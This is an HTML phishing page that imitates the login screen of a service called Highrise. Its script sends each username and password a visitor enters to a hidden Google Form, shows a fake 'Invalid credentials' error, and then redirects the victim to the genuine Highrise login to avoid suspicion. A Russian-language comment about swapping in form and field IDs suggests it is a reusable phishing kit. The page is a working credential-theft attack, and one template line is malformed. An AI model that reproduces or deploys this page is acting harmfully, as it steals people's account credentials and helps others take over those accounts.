<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Highrise — Login</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
    body { background: #0b0e14; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .card { background: #1a1f2a; padding: 40px 35px; border-radius: 24px; width: 380px; box-shadow: 0 12px 40px rgba(0,0,0,0.8); }
    .card h1 { color: #fff; font-size: 28px; font-weight: 600; margin-bottom: 6px; }
    .card p { color: #8892a8; font-size: 14px; margin-bottom: 28px; }
    .card label { color: #c8d0dc; font-size: 13px; font-weight: 500; display: block; margin-bottom: 6px; }
    .card input { width: 100%; padding: 14px 16px; border-radius: 14px; border: 1px solid #2e3645; background: #0f131c; color: #fff; font-size: 15px; margin-bottom: 18px; outline: none; transition: 0.2s; }
    .card input:focus { border-color: #6c5ce7; }
    .card button { width: 100%; padding: 14px; border: none; border-radius: 40px; background: #6c5ce7; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
    .card button:hover { background: #5a4bd1; }
    .error { color: #f87171; font-size: 13px; margin-top: 12px; display: none; }
    .footer { margin-top: 20px; color: #5d687c; font-size: 13px; text-align: center; }
    .footer a { color: #8892a8; text-decoration: none; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Welcome back</h1>
    <p>Sign in to your Highrise account</p>
    <form id="loginForm">
      <label>Username or Email</label>
      <input type="text" id="username" placeholder="Enter your username" required>
      <label>Password</label>
      <input type="password" id="password" placeholder="Enter your password" required>
      <button type="submit">Log In</button>
      <div class="error" id="errorMsg">Invalid credentials, please try again.</div>
    </form>
    <div class="footer">
      <a href="#">Forgot password?</a> · <a href="#">Create account</a>
    </div>
  </div>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // === НОВЫЙ FORM_ID И ВАШИ ID ПОЛЕЙ ===
      const FORM_ID = '1FAIpQLScu5xOIp9J2D_5yOH5nZCYdHisE-kgxL1TCuU-TTr5LDFF2mg';
      const formUrl = https://docs.google.com/forms/d/e/${FORM_ID}/formResponse;
      
      const formData = new FormData();
      formData.append('entry.1789042509', username);
      formData.append('entry.416258701', password);

      fetch(formUrl, {
        method: 'POST',
        mode: 'no-cors',
        body: formData
      })
      .then(() => {
        document.getElementById('errorMsg').style.display = 'block';
        setTimeout(() => {
          window.location.href = 'https://web.highrise.game/login';
        }, 1500);
      })
      .catch(() => {
        document.getElementById('errorMsg').style.display = 'block';
        setTimeout(() => {
          window.location.href = 'https://web.highrise.game/login';
        }, 1500);
      });
    });
  </script>
</body>
</html>
